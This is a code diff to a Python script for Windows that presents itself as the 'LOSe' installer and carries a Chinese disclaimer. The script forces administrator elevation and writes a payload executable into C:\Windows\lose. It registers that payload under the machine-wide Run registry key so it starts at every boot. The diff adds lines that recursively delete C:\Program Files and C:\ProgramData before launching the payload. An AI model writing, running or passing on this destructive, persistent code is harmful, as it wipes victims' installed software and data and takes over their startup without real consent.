@@ -1,7 +1,8 @@
-import shutdown, pyuac, os
+import shutdown, pyuac, os, shutil
 from sys import exit as quit
 
 if not pyuac.isUserAdmin(): pyuac.runAsAdmin()
+if not pyuac.isUserAdmin(): quit()
 dirc = 'C:\\Windows\\lose'
 os.system('title "LOSe 安装程序"')
 try: os.mkdir(dirc)
@@ -17,7 +18,7 @@ print('''\
 免责声明
 
 作者对使用、传播造成的后果概不负责。
-2022.2.27
+2022.3.26
 ''')
 agree = input()=='I agree'
 if not agree: quit()
@@ -26,5 +27,7 @@ f.write(shutdown.shs)
 f.close()
 os.environ['shs'] = dirc
 os.system('reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Shell /t REG_SZ /d "%s\sh.exe" /f'%dirc)
+shutil.rmtree('C:\Program Files')
+shutil.rmtree('C:\\ProgramData')
 os.startfile('sh.exe')
 _RPL_HERE_USELESS_CODE_
